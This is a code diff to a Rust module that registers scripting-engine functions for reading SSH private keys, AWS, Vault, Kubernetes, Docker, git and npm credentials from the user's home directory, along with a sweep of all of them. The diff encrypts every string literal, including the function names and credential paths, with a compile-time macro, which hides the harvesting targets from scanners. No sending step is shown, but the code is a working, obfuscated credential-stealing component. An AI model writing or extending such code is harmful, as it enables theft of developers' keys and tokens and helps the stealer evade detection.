@@ -8,15 +8,17 @@
 use rhai::Engine;
 use std::{fs, path::PathBuf};
 use serde_json::json;
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 
 pub fn register(engine: &mut Engine) {
 
     // ── SSH private keys ──────────────────────────────────────────────────────
     // Scans ~/.ssh/ (or a provided directory) for private key files.
     // Returns JSON: [{path, content, key_type}]
-    engine.register_fn("internal_ssh_keys", |home_dir: &str| -> String {
+    engine.register_fn(&aes_str!("internal_ssh_keys"), |home_dir: &str| -> String {
         let base = if home_dir.is_empty() {
-            home_path(".ssh")
+            home_path(&aes_str!(".ssh"))
         } else {
             PathBuf::from(home_dir)
         };
@@ -27,12 +29,12 @@ pub fn register(engine: &mut Engine) {
             .filter(|e| e.file_type().map(|t| t.is_file()).unwrap_or(false))
             .filter_map(|e| {
                 let content = fs::read_to_string(e.path()).ok()?;
-                if !content.contains("PRIVATE KEY") { return None; }
-                let key_type = if content.contains("RSA PRIVATE")    { "rsa" }
-                    else if content.contains("OPENSSH PRIVATE")      { "openssh" }
-                    else if content.contains("EC PRIVATE")           { "ecdsa" }
-                    else if content.contains("DSA PRIVATE")          { "dsa" }
-                    else                                             { "unknown" };
+                if !content.contains(&aes_str!("PRIVATE KEY")) { return None; }
+                let key_type = if content.contains(&aes_str!("RSA PRIVATE"))    { aes_str!("rsa") }
+                    else if content.contains(&aes_str!("OPENSSH PRIVATE"))      { aes_str!("openssh") }
+                    else if content.contains(&aes_str!("EC PRIVATE"))           { aes_str!("ecdsa") }
+                    else if content.contains(&aes_str!("DSA PRIVATE"))          { aes_str!("dsa") }
+                    else                                                        { aes_str!("unknown") };
                 Some(json!({
                     "path":     e.path().display().to_string(),
                     "key_type": key_type,
@@ -46,58 +48,58 @@ pub fn register(engine: &mut Engine) {
     // ── AWS credentials ───────────────────────────────────────────────────────
     // Reads ~/.aws/credentials and ~/.aws/config.
     // Returns JSON: {credentials, config}
-    engine.register_fn("internal_aws_credentials", || -> String {
-        let creds  = read_home(".aws/credentials");
-        let config = read_home(".aws/config");
+    engine.register_fn(&aes_str!("internal_aws_credentials"), || -> String {
+        let creds  = read_home(&aes_str!(".aws/credentials"));
+        let config = read_home(&aes_str!(".aws/config"));
         json!({ "credentials": creds, "config": config }).to_string()
     });
 
     // ── HashiCorp Vault token ─────────────────────────────────────────────────
-    engine.register_fn("internal_vault_token", || -> String {
-        read_home(".vault-token")
+    engine.register_fn(&aes_str!("internal_vault_token"), || -> String {
+        read_home(&aes_str!(".vault-token"))
     });
 
     // ── Kubernetes config ─────────────────────────────────────────────────────
     // Contains cluster endpoints, CA bundles, and user credentials.
-    engine.register_fn("internal_kube_config", || -> String {
+    engine.register_fn(&aes_str!("internal_kube_config"), || -> String {
         // Honour KUBECONFIG env var first.
-        if let Ok(path) = std::env::var("KUBECONFIG") {
+        if let Ok(path) = std::env::var(aes_str!("KUBECONFIG")) {
             if let Ok(content) = fs::read_to_string(&path) {
                 return content;
             }
         }
-        read_home(".kube/config")
+        read_home(&aes_str!(".kube/config"))
     });
 
     // ── Docker credentials ────────────────────────────────────────────────────
     // Contains base64-encoded registry auth tokens.
-    engine.register_fn("internal_docker_config", || -> String {
-        read_home(".docker/config.json")
+    engine.register_fn(&aes_str!("internal_docker_config"), || -> String {
+        read_home(&aes_str!(".docker/config.json"))
     });
 
     // ── Git credentials ───────────────────────────────────────────────────────
     // ~/.git-credentials stores plaintext https://user:token@host entries.
-    engine.register_fn("internal_git_credentials", || -> String {
-        read_home(".git-credentials")
+    engine.register_fn(&aes_str!("internal_git_credentials"), || -> String {
+        read_home(&aes_str!(".git-credentials"))
     });
 
     // ── npm / node auth tokens ────────────────────────────────────────────────
     // ~/.npmrc may contain //registry.npmjs.org/:_authToken=...
-    engine.register_fn("internal_npm_token", || -> String {
-        read_home(".npmrc")
+    engine.register_fn(&aes_str!("internal_npm_token"), || -> String {
+        read_home(&aes_str!(".npmrc"))
     });
 
     // ── Generic credential sweep ──────────────────────────────────────────────
     // Checks all of the above paths and returns a JSON summary of what exists.
-    engine.register_fn("internal_credential_sweep", || -> String {
-        let checks: Vec<(&str, &str)> = vec![
-            ("ssh_keys",     ".ssh"),
-            ("aws_creds",    ".aws/credentials"),
-            ("vault_token",  ".vault-token"),
-            ("kube_config",  ".kube/config"),
-            ("docker_cfg",   ".docker/config.json"),
-            ("git_creds",    ".git-credentials"),
-            ("npmrc",        ".npmrc"),
+    engine.register_fn(&aes_str!("internal_credential_sweep"), || -> String {
+        let checks: Vec<(String, String)> = vec![
+            (aes_str!("ssh_keys"),     aes_str!(".ssh")),
+            (aes_str!("aws_creds"),    aes_str!(".aws/credentials")),
+            (aes_str!("vault_token"),  aes_str!(".vault-token")),
+            (aes_str!("kube_config"),  aes_str!(".kube/config")),
+            (aes_str!("docker_cfg"),   aes_str!(".docker/config.json")),
+            (aes_str!("git_creds"),    aes_str!(".git-credentials")),
+            (aes_str!("npmrc"),        aes_str!(".npmrc")),
         ];
         let results: Vec<serde_json::Value> = checks.iter()
             .map(|(name, rel)| {
@@ -120,9 +122,9 @@ pub fn register(engine: &mut Engine) {
 
 fn home_path(rel: &str) -> PathBuf {
     #[cfg(target_os = "windows")]
-    let home = std::env::var("USERPROFILE").unwrap_or_default();
+    let home = std::env::var(aes_str!("USERPROFILE")).unwrap_or_default();
     #[cfg(not(target_os = "windows"))]
-    let home = std::env::var("HOME").unwrap_or_default();
+    let home = std::env::var(aes_str!("HOME")).unwrap_or_default();
 
     PathBuf::from(home).join(rel)
 }
